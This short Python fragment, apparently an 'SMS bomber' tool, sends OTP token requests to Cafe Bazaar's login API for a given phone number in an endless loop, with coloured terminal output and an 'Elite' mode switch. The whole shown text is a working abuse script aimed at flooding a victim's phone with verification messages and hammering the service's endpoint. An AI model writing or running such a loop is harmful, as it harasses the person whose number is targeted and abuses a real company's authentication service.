...
pink='\033[35m'
rang='\033[34m'
link = "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest"
...
if Elite == 1:
    ...
    while True:
              requests.post(link,data={"properties":{"language":2,"clientID":"6s5i0azehjir586uy7ygy90xz97jzptj","deviceID":"6s5i0azehjir586uy7ygy90xz97jzptj","clientVersion":"web"},"singleRequest":{"getOtpTokenRequest":{"username":"98+number"}}})
